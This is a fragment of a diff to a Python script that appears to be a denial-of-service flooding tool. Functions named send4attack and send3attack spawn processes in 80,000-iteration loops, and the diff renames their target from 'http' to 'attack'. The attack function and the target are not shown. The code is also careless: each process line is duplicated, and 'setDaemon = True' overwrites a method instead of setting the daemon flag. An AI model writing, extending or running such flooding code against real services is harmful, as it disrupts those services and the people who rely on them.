@@ -88,8 +88,8 @@ bar2.finish()
 
 def send4attack():
   for i in range(80000): 
-    mp = multiprocessing.Process(target=http)
-    mp = multiprocessing.Process(target=http)
+    mp = multiprocessing.Process(target=attack)
+    mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
     mp.start() 
     sleep(2.0)
@@ -100,8 +100,8 @@ send4attack()
 
 def send3attack():
   for i in range(80000): 
-    mp = multiprocessing.Process(target=http)
-    mp = multiprocessing.Process(target=http)
+    mp = multiprocessing.Process(target=attack)
+    mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
     mp.start() 
     sleep(1.0)
